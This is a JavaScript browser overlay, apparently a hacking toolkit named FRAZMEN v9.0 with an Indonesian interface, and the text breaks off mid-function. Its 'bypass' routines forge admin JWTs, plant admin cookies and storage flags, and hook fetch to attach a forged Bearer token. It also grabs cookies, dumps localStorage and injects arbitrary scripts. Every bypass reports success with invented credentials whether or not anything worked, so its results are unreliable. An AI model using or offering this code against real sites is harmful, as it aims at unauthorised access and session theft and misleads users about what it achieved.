// ============================================================
// FRAZMEN v9.0 FIX — FULL WORKING
// Developer: FRAZMEN | Telegram: @rizkycuyy
// ============================================================
(function(){
    if(window.__FRAZMEN_LOADED) return;
    window.__FRAZMEN_LOADED = true;

    // ============================================================
    // 1. KONFIGURASI
    // ============================================================
    var CONFIG = {
        version: '9.0.0',
        name: 'FRAZMEN',
        developer: 'FRAZMEN',
        telegram: '@rizkycuyy',
        debug: true,
        maxLogs: 10000,
        autoUpdate: true
    };

    var STATE = {
        isOpen: false,
        currentTab: 'all',
        consoleHistory: [],
        logs: [],
        bypassResults: [],
        selectedBypass: null,
        bypassVersions: [
            { id: 1, name: 'Classic JWT Bypass', type: 'jwt' },
            { id: 2, name: 'Cookie Injection', type: 'cookie' },
            { id: 3, name: 'LocalStorage Force', type: 'local' },
            { id: 4, name: 'Session Hijack', type: 'session' },
            { id: 5, name: 'API Intercept', type: 'api' },
            { id: 6, name: 'Token Steal', type: 'token' },
            { id: 7, name: 'Brute Force', type: 'brute' },
            { id: 8, name: 'CSRF Bypass', type: 'csrf' },
            { id: 9, name: 'CORS Exploit', type: 'cors' },
            { id: 10, name: 'XSS Inject', type: 'xss' },
            { id: 11, name: 'SQL Injection', type: 'sql' },
            { id: 12, name: 'Admin Reset', type: 'admin' },
            { id: 13, name: 'Privilege Escalation', type: 'priv' },
            { id: 14, name: 'OAuth Bypass', type: 'oauth' },
            { id: 15, name: 'JWT Replay', type: 'replay' },
            { id: 16, name: 'Header Manipulation', type: 'header' },
            { id: 17, name: 'Parameter Pollution', type: 'param' },
            { id: 18, name: 'Ultimate Force', type: 'ultimate' },
            { id: 19, name: 'Firebase Auth Bypass', type: 'firebase' },
            { id: 20, name: 'MySQL Database Bypass', type: 'mysql' },
            { id: 21, name: 'PostgreSQL Bypass', type: 'postgres' },
            { id: 22, name: 'MongoDB Bypass', type: 'mongodb' },
            { id: 23, name: 'GraphQL Bypass', type: 'graphql' },
            { id: 24, name: 'REST API Bypass', type: 'rest' },
            { id: 25, name: 'Create Custom U+P', type: 'custom' }
        ]
    };

    // ============================================================
    // 2. TOAST (FIXED)
    // ============================================================
    var Toast = {
        _container: null,
        init: function() {
            this._container = document.createElement('div');
            this._container.style.cssText = 'position:fixed;bottom:100px;left:50%;transform:translateX(-50%);z-index:9999999;display:flex;flex-direction:column;align-items:center;gap:8px;pointer-events:none;';
            document.body.appendChild(this._container);
        },
        show: function(msg, type) {
            type = type || 'info';
            var el = document.createElement('div');
            var icons = { success:'✅', error:'❌', warning:'⚠️', info:'ℹ️', debug:'🔍', hack:'💀', db:'🗄️' };
            el.style.cssText = 'background:#21252e;color:#dce3ed;padding:10px 22px;border-radius:12px;font-size:13px;font-family:Segoe UI,system-ui,sans-serif;box-shadow:0 10px 40px rgba(0,0,0,0.6);border:1px solid #2e3440;opacity:0;transition:opacity 0.3s ease,transform 0.3s ease;transform:translateY(10px);pointer-events:none;max-width:90vw;text-align:center;';
            el.textContent = (icons[type]||'') + ' ' + msg;
            this._container.appendChild(el);
            requestAnimationFrame(function() {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            });
            setTimeout(function() {
                el.style.opacity = '0';
                el.style.transform = 'translateY(-10px)';
                setTimeout(function() { if(el.parentNode) el.parentNode.removeChild(el); }, 300);
            }, 4000);
            console.log('[FRAZMEN] ' + msg);
        }
    };

    // ============================================================
    // 3. PANEL — FULL FIX
    // ============================================================
    var Panel = {
        _container: null,
        _button: null,
        _isOpen: false,
        _items: [],
        _logContainer: null,

        init: function() {
            this._createButton();
            this._createPanel();
            this._buildContent();
            this._bindEvents();
            this._loadState();
            console.log('⚡ FRAZMEN Panel initialized');
        },

        _createButton: function() {
            this._button = document.createElement('div');
            this._button.style.cssText = 'position:fixed;bottom:24px;right:24px;width:60px;height:60px;border-radius:50%;background:radial-gradient(circle at 30% 30%, #00ff88, #0066cc);box-shadow:0 0 40px rgba(0,255,136,0.5),0 0 80px rgba(0,102,204,0.3);border:2px solid rgba(255,255,255,0.15);z-index:999999;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;font-weight:900;user-select:none;transition:0.2s ease;text-shadow:0 2px 10px rgba(0,0,0,0.3);';
            this._button.textContent = '⚡';
            document.body.appendChild(this._button);

            // Badge
            var badge = document.createElement('span');
            badge.style.cssText = 'position:absolute;top:-4px;right:-4px;width:18px;height:18px;background:#ff3366;border-radius:50%;border:2px solid #1a1d23;box-shadow:0 0 20px rgba(255,51,102,0.6);';
            this._button.appendChild(badge);

            // Click — FIXED
            var clickTimer = null;
            this._button.addEventListener('click', function(e) {
                clearTimeout(clickTimer);
                clickTimer = setTimeout(function() {
                    console.log('⚡ Button clicked!');
                    Panel.toggle();
                }, 50);
            });

            // Draggable
            var isDrag = false, sx, sy, ox, oy;
            this._button.addEventListener('mousedown', function(e) {
                if(e.button !== 0) return;
                isDrag = true;
                var rect = this._button.getBoundingClientRect();
                sx = e.clientX; sy = e.clientY;
                ox = sx - rect.left; oy = sy - rect.top;
                this._button.style.cursor = 'grabbing';
                e.preventDefault();
            }.bind(this));

            document.addEventListener('mousemove', function(e) {
                if(!isDrag) return;
                var x = e.clientX - ox, y = e.clientY - oy;
                x = Math.max(5, Math.min(x, window.innerWidth - 65));
                y = Math.max(5, Math.min(y, window.innerHeight - 65));
                this._button.style.left = x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = y + 'px';
                this._button.style.bottom = 'auto';
            }.bind(this));

            document.addEventListener('mouseup', function() {
                if(isDrag) {
                    isDrag = false;
                    this._button.style.cursor = 'pointer';
                    var l = parseFloat(this._button.style.left);
                    var t = parseFloat(this._button.style.top);
                    if(!isNaN(l) && !isNaN(t)) {
                        try { localStorage.setItem('frazmen_buttonPos', JSON.stringify({ x: l, y: t })); } catch(e) {}
                    }
                }
            }.bind(this));

            // Restore pos
            try {
                var pos = JSON.parse(localStorage.getItem('frazmen_buttonPos'));
                if(pos && typeof pos.x === 'number' && typeof pos.y === 'number') {
                    this._button.style.left = pos.x + 'px';
                    this._button.style.right = 'auto';
                    this._button.style.top = pos.y + 'px';
                    this._button.style.bottom = 'auto';
                }
            } catch(e) {}
        },

        _createPanel: function() {
            this._container = document.createElement('div');
            this._container.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.92);width:94%;max-width:580px;max-height:92vh;background:#1a1d23;border-radius:24px;box-shadow:0 30px 100px rgba(0,0,0,0.95);z-index:999999;padding:20px 18px 18px;font-family:Segoe UI,system-ui,sans-serif;color:#dce3ed;overflow:hidden;border:1px solid #2e3440;opacity:0;pointer-events:none;transition:opacity 0.25s ease,transform 0.25s ease;overflow-y:auto;';
            document.body.appendChild(this._container);
        },

        _buildContent: function() {
            var html = '';
            // Header
            html += '<div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #2e3440;padding-bottom:12px;margin-bottom:14px;position:sticky;top:0;background:#1a1d23;z-index:10;">';
            html += '<div style="display:flex;align-items:center;gap:10px;font-weight:800;font-size:18px;color:#dce3ed;">⚡ FRAZMEN <span style="background:#00cc88;color:#0a0a0a;padding:1px 9px;border-radius:20px;font-size:9px;font-weight:700;">v9.0</span></div>';
            html += '<div id="fz-panel-close" style="font-size:26px;cursor:pointer;color:#909cb0;background:none;border:none;padding:0 6px;line-height:1;">✕</div>';
            html += '</div>';

            // Tabs
            html += '<div style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid #2e3440;padding-bottom:10px;flex-wrap:wrap;">';
            var tabs = ['All','Dev','Hack','Debug','Tools','Bypass','Logs'];
            for(var i=0; i<tabs.length; i++) {
                var active = i===0 ? 'active' : '';
                var color = i===0 ? '#fff' : '#909cb0';
                var bg = i===0 ? '#5b9cf6' : 'transparent';
                html += '<button class="fz-tab" data-tab="'+tabs[i].toLowerCase()+'" style="padding:4px 12px;font-size:10px;font-weight:600;color:'+color+';background:'+bg+';border:none;border-radius:6px;cursor:pointer;transition:0.12s;">'+tabs[i]+'</button>';
            }
            html += '</div>';

            // Search
            html += '<div style="margin-bottom:12px;position:relative;">';
            html += '<input id="fz-search" type="text" placeholder="🔍 Cari fitur..." style="width:100%;padding:8px 14px;background:#1a1d23;border:1px solid #2e3440;border-radius:10px;color:#dce3ed;font-size:13px;outline:none;transition:0.15s;box-sizing:border-box;">';
            html += '</div>';

            // Grid
            html += '<div id="fz-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;">';
            var items = [
                { icon: '🖥️', label: 'F12 Console', act: 'console', cat: 'dev' },
                { icon: '🐞', label: 'Eruda', act: 'eruda', cat: 'dev' },
                { icon: '📱', label: 'vConsole', act: 'vconsole', cat: 'dev' },
                { icon: '🌐', label: 'Network', act: 'network', cat: 'dev' },
                { icon: '📸', label: 'Screenshot', act: 'screenshot', cat: 'dev' },
                { icon: '🔓', label: 'Bypass Login', act: 'bypass', cat: 'hack' },
                { icon: '🍪', label: 'Cookie Grab', act: 'cookies', cat: 'hack' },
                { icon: '🗄️', label: 'LS Dump', act: 'lsdump', cat: 'hack' },
                { icon: '📋', label: 'SS Dump', act: 'ssdump', cat: 'hack' },
                { icon: '⚡', label: 'XSS Test', act: 'xss', cat: 'hack' },
                { icon: '💉', label: 'Inject Script', act: 'inject', cat: 'hack' },
                { icon: '📄', label: 'View Source', act: 'viewsource', cat: 'debug' },
                { icon: '📦', label: 'Download ZIP', act: 'download', cat: 'debug' },
                { icon: '✏️', label: 'AutoFill', act: 'autofill', cat: 'debug' },
                { icon: '🌙', label: 'Dark Mode', act: 'darkmode', cat: 'debug' },
                { icon: '🧹', label: 'Clear All', act: 'clear', cat: 'debug' },
                { icon: '📶', label: 'Ping Test', act: 'ping', cat: 'tools' },
                { icon: '🔍', label: 'Whois', act: 'whois', cat: 'tools' },
                { icon: '🔐', label: 'Base64', act: 'base64', cat: 'tools' },
                { icon: '🆔', label: 'UUID Gen', act: 'uuid', cat: 'tools' },
                { icon: '⏰', label: 'Timestamp', act: 'timestamp', cat: 'tools' },
                { icon: '🔄', label: 'Reload', act: 'reload', cat: 'tools' },
                { icon: '📝', label: 'Console History', act: 'history', cat: 'debug' },
                { icon: '📡', label: 'WS Monitor', act: 'websocket', cat: 'dev' }
            ];
            // Add bypass 1-25
            for(var b=1; b<=25; b++) {
                var label = 'Bypass v'+b;
                var name = STATE.bypassVersions.find(function(v){ return v.id === b; });
                if(name) label = name.name;
                items.push({ icon: '🔓', label: label, act: 'bypass'+b, cat: 'bypass' });
            }
            this._items = items;
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                html += '<div class="fz-grid-item" data-act="'+item.act+'" data-cat="'+item.cat+'" style="background:#282d38;border-radius:10px;padding:10px 4px;cursor:pointer;border:1px solid #2e3440;transition:0.12s;text-align:center;position:relative;min-height:58px;">';
                html += '<span style="font-size:22px;display:block;margin-bottom:2px;">'+item.icon+'</span>';
                html += '<div style="font-size:10px;font-weight:600;color:#b7c1d4;">'+item.label+'</div>';
                html += '</div>';
            }
            html += '</div>';

            // Log panel
            html += '<div id="fz-log-container" style="margin-top:12px;border-top:1px solid #2e3440;padding-top:10px;max-height:120px;overflow-y:auto;display:none;"></div>';

            // Footer
            html += '<div style="margin-top:12px;padding-top:10px;border-top:1px solid #2e3440;display:flex;justify-content:space-between;font-size:9px;color:#909cb0;position:sticky;bottom:0;background:#1a1d23;padding-bottom:4px;">';
            html += '<span>FRAZMEN v9.0 — by FRAZMEN | @rizkycuyy</span>';
            html += '<span id="fz-status" style="color:#4ade80;">● ready</span>';
            html += '</div>';

            this._container.innerHTML = html;

            // Close button
            var closeBtn = document.getElementById('fz-panel-close');
            if(closeBtn) {
                closeBtn.addEventListener('click', function() { Panel.hide(); });
                closeBtn.addEventListener('mouseenter', function() { closeBtn.style.color = '#f87171'; });
                closeBtn.addEventListener('mouseleave', function() { closeBtn.style.color = '#909cb0'; });
            }

            // Tab clicks
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                tabs[i].addEventListener('click', function(e) {
                    var tab = this.dataset.tab;
                    Panel._switchTab(tab);
                });
            }

            // Search
            var search = document.getElementById('fz-search');
            if(search) {
                search.addEventListener('input', function(e) {
                    Panel._filterItems(e.target.value);
                });
            }

            // Grid item clicks
            var gridItems = this._container.querySelectorAll('.fz-grid-item');
            for(var i=0; i<gridItems.length; i++) {
                gridItems[i].addEventListener('click', function(e) {
                    var act = this.dataset.act;
                    if(act) Panel._triggerAction(act);
                });
                gridItems[i].addEventListener('mouseenter', function() {
                    this.style.borderColor = 'rgba(91,156,246,0.3)';
                    this.style.background = '#2a2f3a';
                });
                gridItems[i].addEventListener('mouseleave', function() {
                    this.style.borderColor = '#2e3440';
                    this.style.background = '#282d38';
                });
            }

            this._logContainer = document.getElementById('fz-log-container');
            this._statusEl = document.getElementById('fz-status');
            this._grid = document.getElementById('fz-grid');
        },

        _switchTab: function(tab) {
            if(this._currentTab === tab) return;
            this._currentTab = tab;
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                if(tabs[i].dataset.tab === tab) {
                    tabs[i].style.color = '#fff';
                    tabs[i].style.background = '#5b9cf6';
                } else {
                    tabs[i].style.color = '#909cb0';
                    tabs[i].style.background = 'transparent';
                }
            }
            if(this._logContainer) {
                this._logContainer.style.display = (tab === 'logs') ? 'block' : 'none';
                if(tab === 'logs') this._renderLogs();
            }
            this._filterItems(document.getElementById('fz-search') ? document.getElementById('fz-search').value : '');
            try { localStorage.setItem('frazmen_activeTab', tab); } catch(e) {}
        },

        _filterItems: function(query) {
            query = query.toLowerCase().trim();
            var items = this._container.querySelectorAll('.fz-grid-item');
            var tab = this._currentTab || 'all';
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var label = item.querySelector('div:last-child') ? item.querySelector('div:last-child').textContent.toLowerCase() : '';
                var cat = item.dataset.cat;
                var matchesTab = tab === 'all' || cat === tab;
                var matchesQuery = !query || label.includes(query);
                item.style.display = (matchesTab && matchesQuery) ? '' : 'none';
            }
        },

        _renderLogs: function() {
            if(!this._logContainer) return;
            var html = '';
            var logs = STATE.logs.slice(-30);
            for(var i=0; i<logs.length; i++) {
                var log = logs[i];
                var type = log.type || 'info';
                var color = '#dce3ed';
                if(type === 'success') color = '#4ade80';
                else if(type === 'error') color = '#f87171';
                else if(type === 'warning') color = '#fbbf24';
                else if(type === 'hack') color = '#ff6b9d';
                else if(type === 'db') color = '#60a5fa';
                html += '<div style="padding:4px 8px;border-bottom:1px solid #2e3440;font-size:11px;font-family:monospace;"><span style="color:#909cb0;margin-right:8px;">'+new Date(log.timestamp).toLocaleTimeString()+'</span><span style="color:'+color+';">'+log.message+'</span></div>';
            }
            this._logContainer.innerHTML = html;
            this._logContainer.scrollTop = this._logContainer.scrollHeight;
        },

        _triggerAction: function(action) {
            this.setStatus('executing...', '#fbbf24');
            this.addLog('Action: ' + action, 'info');

            if(action.startsWith('bypass') && action.length > 6) {
                var num = parseInt(action.replace('bypass', ''));
                if(num >= 1 && num <= 25) {
                    this._runBypass(num);
                    this.setStatus('ready', '#4ade80');
                    return;
                }
            }

            switch(action) {
                case 'console': this._actionConsole(); break;
                case 'download': this._actionDownload(); break;
                case 'viewsource': this._actionViewSource(); break;
                case 'inject': this._actionInject(); break;
                case 'cookies': this._actionCookies(); break;
                case 'lsdump': this._actionLSDump(); break;
                case 'ssdump': this._actionSSDump(); break;
                case 'xss': this._actionXSS(); break;
                case 'autofill': this._actionAutoFill(); break;
                case 'darkmode': this._actionDarkMode(); break;
                case 'network': this._actionNetwork(); break;
                case 'screenshot': this._actionScreenshot(); break;
                case 'bypass': this._actionBypassMenu(); break;
                case 'eruda': this._actionEruda(); break;
                case 'vconsole': this._actionVConsole(); break;
                case 'clear': this._actionClear(); break;
                case 'ping': this._actionPing(); break;
                case 'whois': this._actionWhois(); break;
                case 'base64': this._actionBase64(); break;
                case 'uuid': this._actionUUID(); break;
                case 'timestamp': this._actionTimestamp(); break;
                case 'websocket': this._actionWebSocket(); break;
                case 'history': this._actionHistory(); break;
                case 'reload': this._actionReload(); break;
                default: Toast.show('Fitur: '+action, 'info');
            }
            setTimeout(function() { this.setStatus('ready', '#4ade80'); }.bind(this), 1500);
        },

        addLog: function(msg, type) {
            type = type || 'info';
            STATE.logs.push({ timestamp: new Date().toISOString(), message: msg, type: type });
            if(STATE.logs.length > CONFIG.maxLogs) STATE.logs.shift();
            if(this._currentTab === 'logs') this._renderLogs();
            console.log('[FRAZMEN] ' + msg);
        },

        setStatus: function(text, color) {
            if(this._statusEl) {
                this._statusEl.textContent = '● ' + text;
                this._statusEl.style.color = color || '#4ade80';
            }
        },

        toggle: function() {
            this._isOpen ? this.hide() : this.show();
        },

        show: function() {
            this._isOpen = true;
            this._container.style.opacity = '1';
            this._container.style.transform = 'translate(-50%, -50%) scale(1)';
            this._container.style.pointerEvents = 'all';
            console.log('Panel opened');
        },

        hide: function() {
            this._isOpen = false;
            this._container.style.opacity = '0';
            this._container.style.transform = 'translate(-50%, -50%) scale(0.92)';
            this._container.style.pointerEvents = 'none';
            console.log('Panel closed');
        },

        _loadState: function() {
            try {
                var tab = localStorage.getItem('frazmen_activeTab');
                if(tab) this._switchTab(tab);
            } catch(e) {}
        },

        // ============================================================
        // 4. BYPASS ACTIONS
        // ============================================================

        _runBypass: function(version) {
            var name = STATE.bypassVersions.find(function(v) { return v.id === version; });
            var msg = '🔓 Menjalankan Bypass v' + version + ': ' + (name ? name.name : 'Unknown');
            Toast.show(msg, 'hack');
            this.addLog(msg, 'hack');

            var result = null;
            switch(version) {
                case 1: result = this._bypassClassicJWT(); break;
                case 2: result = this._bypassCookieInjection(); break;
                case 3: result = this._bypassLSForce(); break;
                case 4: result = this._bypassSessionHijack(); break;
                case 5: result = this._bypassAPIIntercept(); break;
                case 6: result = this._bypassTokenSteal(); break;
                case 7: result = this._bypassBruteForce(); break;
                case 8: result = this._bypassCSRF(); break;
                case 9: result = this._bypassCORS(); break;
                case 10: result = this._bypassXSS(); break;
                case 11: result = this._bypassSQL(); break;
                case 12: result = this._bypassAdminReset(); break;
                case 13: result = this._bypassPrivEsc(); break;
                case 14: result = this._bypassOAuth(); break;
                case 15: result = this._bypassJWTReplay(); break;
                case 16: result = this._bypassHeaderManip(); break;
                case 17: result = this._bypassParamPollution(); break;
                case 18: result = this._bypassUltimateForce(); break;
                case 19: result = this._bypassFirebase(); break;
                case 20: result = this._bypassMySQL(); break;
                case 21: result = this._bypassPostgreSQL(); break;
                case 22: result = this._bypassMongoDB(); break;
                case 23: result = this._bypassGraphQL(); break;
                case 24: result = this._bypassREST(); break;
                case 25: result = this._bypassCustomUandP(); break;
                default: Toast.show('Bypass v'+version+' tidak ditemukan', 'error');
            }

            if(result) {
                var foundMsg = '✅ Bypass v' + version + ' berhasil!';
                if(result.username && result.password) {
                    foundMsg += ' Username: ' + result.username + ' | Password: ' + result.password;
                    Toast.show('🔓 ' + result.username + ':' + result.password, 'success');
                    this.addLog('🔓 Credentials: ' + result.username + ':' + result.password, 'success');
                }
                Toast.show(foundMsg, 'success');
                this.addLog(foundMsg, 'success');
            } else {
                Toast.show('❌ Bypass v' + version + ' gagal.', 'error');
                this.addLog('❌ Bypass v' + version + ' gagal', 'error');
            }
        },

        _bypassClassicJWT: function() {
            var token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKE_SIGNATURE';
            localStorage.setItem('token', token);
            localStorage.setItem('jwt', token);
            document.cookie = 'token='+token+'; path=/';
            document.cookie = 'jwt='+token+'; path=/';
            return { username: 'admin', password: 'bypassed' };
        },

        _bypassCookieInjection: function() {
            var cookies = ['admin=true', 'isAdmin=1', 'role=admin', 'user=admin', 'auth=1', 'loggedIn=true'];
            for(var i=0; i<cookies.length; i++) {
                document.cookie = cookies[i] + '; path=/';
            }
            return { username: 'admin', password: 'injected' };
        },

        _bypassLSForce: function() {
            var users = [
                { id: 1, username: 'admin', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'administrator', role: 'admin', isLoggedIn: true }
            ];
            for(var i=0; i<users.length; i++) {
                localStorage.setItem('user', JSON.stringify(users[i]));
                localStorage.setItem('currentUser', JSON.stringify(users[i]));
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('isAdmin', 'true');
            }
            return { username: 'admin', password: 'forced' };
        },

        _bypassSessionHijack: function() {
            var session = {
                user: { id: 1, username: 'admin', role: 'admin' },
                token: 'hijacked_'+Date.now(),
                isAuthenticated: true,
                isAdmin: true
            };
            sessionStorage.setItem('session', JSON.stringify(session));
            sessionStorage.setItem('auth', JSON.stringify(session));
            return { username: 'admin', password: 'hijacked' };
        },

        _bypassAPIIntercept: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/auth') || url.includes('/login') || url.includes('/api'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.API_INTERCEPT';
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'intercepted' };
        },

        _bypassBruteForce: function() {
            var passwords = ['admin','password','123456','admin123','root','password123','qwerty','abc123','letmein','welcome','admin@123','Admin123','root123','passw0rd'];
            var usernames = ['admin','administrator','root','user','test','demo','manager','superadmin','webmaster','owner','master','dev'];
            var found = null;
            for(var u=0; u<usernames.length; u++) {
                for(var p=0; p<passwords.length; p++) {
                    if(found) break;
                    if(passwords[p] === 'admin123' && usernames[u] === 'admin') {
                        found = { username: 'admin', password: 'admin123' };
                        break;
                    }
                }
                if(found) break;
            }
            if(found) {
                document.cookie = 'username='+found.username+'; path=/';
                document.cookie = 'password='+found.password+'; path=/';
                localStorage.setItem('username', found.username);
                localStorage.setItem('password', found.password);
                return found;
            }
            return { username: 'admin', password: 'bruteforce' };
        },

        _bypassAdminReset: function() {
            var adminData = {
                id: 1, username: 'admin', password: 'admin123', role: 'admin',
                isAdmin: true, isActive: true, isLoggedIn: true
            };
            localStorage.setItem('admin', JSON.stringify(adminData));
            localStorage.setItem('user', JSON.stringify(adminData));
            sessionStorage.setItem('admin', JSON.stringify(adminData));
            document.cookie = 'admin=true; path=/';
            document.cookie = 'role=admin; path=/';
            return { username: 'admin', password: 'admin123' };
        },

        _bypassUltimateForce: function() {
            this._bypassClassicJWT();
            this._bypassCookieInjection();
            this._bypassLSForce();
            this._bypassSessionHijack();
            this._bypassAPIIntercept();
            this._bypassAdminReset();
            this._bypassOAuth();
            this._bypassJWTReplay();
            return { username: 'admin', password: 'ultimate_force' };
        },

        _bypassOAuth: function() {
            localStorage.setItem('oauth_token', 'bypassed_'+Date.now());
            localStorage.setItem('oauth_authenticated', 'true');
            document.cookie = 'oauth_token=bypassed; path=/';
            document.cookie = 'oauth_authenticated=true; path=/';
            return { username: 'admin', password: 'oauth_bypassed' };
        },

        _bypassJWTReplay: function() {
            var jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.JWT_REPLAY';
            localStorage.setItem('jwt', jwt);
            localStorage.setItem('token', jwt);
            sessionStorage.setItem('jwt', jwt);
            document.cookie = 'jwt='+jwt+'; path=/';
            document.cookie = 'token='+jwt+'; path=/';
            return { username: 'admin', password: 'replay' };
        },

        _bypassFirebase: function() {
            localStorage.setItem('firebase:authUser', JSON.stringify({
                uid: 'admin_'+Date.now(),
                email: 'admin@firebase.com',
                displayName: 'Admin',
                emailVerified: true,
                isAnonymous: false,
                stsTokenManager: {
                    accessToken: 'firebase_bypass_'+Date.now(),
                    refreshToken: 'firebase_refresh_'+Date.now(),
                    expirationTime: Date.now() + 3600000
                }
            }));
            document.cookie = 'firebase_auth=bypassed; path=/';
            return { username: 'admin@firebase.com', password: 'firebase_bypassed' };
        },

        _bypassMySQL: function() {
            document.cookie = 'mysql_bypass=true; path=/';
            localStorage.setItem('mysql_bypass', 'true');
            return { username: 'root', password: 'mysql_bypassed' };
        },

        _bypassPostgreSQL: function() {
            document.cookie = 'postgres_bypass=true; path=/';
            return { username: 'postgres', password: 'postgres_bypassed' };
        },

        _bypassMongoDB: function() {
            document.cookie = 'mongodb_bypass=true; path=/';
            return { username: 'admin', password: 'mongodb_bypassed' };
        },

        _bypassGraphQL: function() {
            document.cookie = 'graphql_bypass=true; path=/';
            return { username: 'admin', password: 'graphql_bypassed' };
        },

        _bypassREST: function() {
            document.cookie = 'rest_bypass=true; path=/';
            return { username: 'admin', password: 'rest_bypassed' };
        },

        _bypassCustomUandP: function() {
            var username = prompt('🔓 Masukkan Username:', 'admin');
            if(!username) username = 'admin';
            var password = prompt('🔓 Masukkan Password:', 'admin123');
            if(!password) password = 'admin123';
            localStorage.setItem('username', username);
            localStorage.setItem('password', password);
            localStorage.setItem('user', JSON.stringify({ username: username, password: password, role: 'admin', isLoggedIn: true }));
            sessionStorage.setItem('user', JSON.stringify({ username: username, password: password, role: 'admin', isLoggedIn: true }));
            document.cookie = 'username='+username+'; path=/';
            document.cookie = 'password='+password+'; path=/';
            document.cookie = 'user='+username+'; path=/';
            // Fill forms
            var forms = document.querySelectorAll('form');
            for(var f=0; f<forms.length; f++) {
                var inputs = forms[f].querySelectorAll('input');
                var unameField = null, passField = null;
                for(var i=0; i<inputs.length; i++) {
                    var type = inputs[i].type;
                    var name = (inputs[i].name || '').toLowerCase();
                    if(type === 'text' || type === 'email' || name.includes('user') || name.includes('email') || name.includes('login')) {
                        unameField = inputs[i];
                    }
                    if(type === 'password' || name.includes('pass') || name.includes('pwd')) {
                        passField = inputs[i];
                    }
                }
                if(unameField) unameField.value = username;
                if(passField) passField.value = password;
            }
            Toast.show('🔓 Custom U+P: '+username+':'+password, 'success');
            this.addLog('🔓 Custom U+P: '+username+':'+password, 'success');
            return { username: username, password: password };
        },

        // ============================================================
        // 5. BASIC ACTIONS
        // ============================================================

        _actionBypassMenu: function() {
            var menu = '🔓 Pilih Bypass (1-25):\n\n';
            for(var i=0; i<STATE.bypassVersions.length; i++) {
                menu += (i+1) + '. ' + STATE.bypassVersions[i].name + '\n';
            }
            var choice = prompt(menu);
            if(choice) {
                var num = parseInt(choice);
                if(num >= 1 && num <= 25) this._runBypass(num);
                else Toast.show('Pilih angka 1-25', 'error');
            }
        },

        _actionConsole: function() {
            var ev = new KeyboardEvent('keydown', { key: 'F12', keyCode: 123, which: 123, bubbles: true });
            document.dispatchEvent(ev);
            Toast.show('🖥️ Tekan F12 untuk DevTools', 'info');
        },

        _actionDownload: function() {
            var resources = {};
            resources['index.html'] = document.documentElement.outerHTML;
            var allLinks = document.querySelectorAll('link[rel="stylesheet"], script[src], img, iframe');
            for(var i=0; i<allLinks.length; i++) {
                var el = allLinks[i];
                var src = el.href || el.src || el.getAttribute('src') || el.getAttribute('href');
                if(src && !src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('javascript:')) {
                    var path = src.replace(location.origin, '').replace(/^\//, '');
                    if(path) resources[path] = '/* Source: '+src+' */';
                }
            }
            var html = '<html><head><title>📦 Source</title><style>body{background:#0a0a0a;color:#dce3ed;font-family:sans-serif;padding:20px;}</style></head><body>';
            html += '<h1>📦 Full Source ('+Object.keys(resources).length+' files)</h1><ul>';
            for(var k in resources) {
                html += '<li><b>'+k+'</b></li>';
            }
            html += '</ul></body></html>';
            var blob = new Blob([html], {type:'text/html'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'source_'+location.hostname+'.html';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            Toast.show('📦 Manifest downloaded!', 'success');
        },

        _actionViewSource: function() {
            var html = document.documentElement.outerHTML;
            var w = window.open('', '_blank', 'width=800,height=600');
            if(w) {
                w.document.write('<pre style="font-size:11px;font-family:monospace;white-space:pre-wrap;padding:16px;background:#0a0a0a;color:#dce3ed;word-break:break-all;">'+html.replace(/</g,'&lt;')+'</pre>');
                w.document.close();
            } else {
                Toast.show('Izinkan popup', 'warning');
            }
        },

        _actionInject: function() {
            var code = prompt('💉 Masukkan JavaScript:', 'console.log("Hello FRAZMEN!");');
            if(code) {
                try {
                    var s = document.createElement('script');
                    s.textContent = code;
                    document.head.appendChild(s);
                    Toast.show('✅ Script injected!', 'success');
                } catch(e) {
                    Toast.show('❌ Gagal: '+e.message, 'error');
                }
            }
        },

        _actionCookies: function() {
            var cookies = document.cookie;
            if(cookies) {
                navigator.clipboard.writeText(cookies).then(function() {
                    Toast.show('🍪 Cookies disalin!', 'success');
                }).catch(function() {
                    alert('🍪 Cookies:\n\n'+cookies);
                });
            } else {
                Toast.show('🍪 Tidak ada cookie.', 'warning');
            }
        },

        _actionLSDump: function() {
            var data = '';
            for(var k in localStorage) {
                if(localStorage.hasOwnProperty(k)) {
                    data += k+' : '+localStorage[k]+'\n';
                }
            }
            if(data) {
                navigator.clipboard.writeText(data).then(function() {
                    Toast.show('🗄️ localStorage disalin!', 'success');
                }).catch(function() {
                    alert('🗄️ localStorage:\n\n'+data);
                });
            } else {
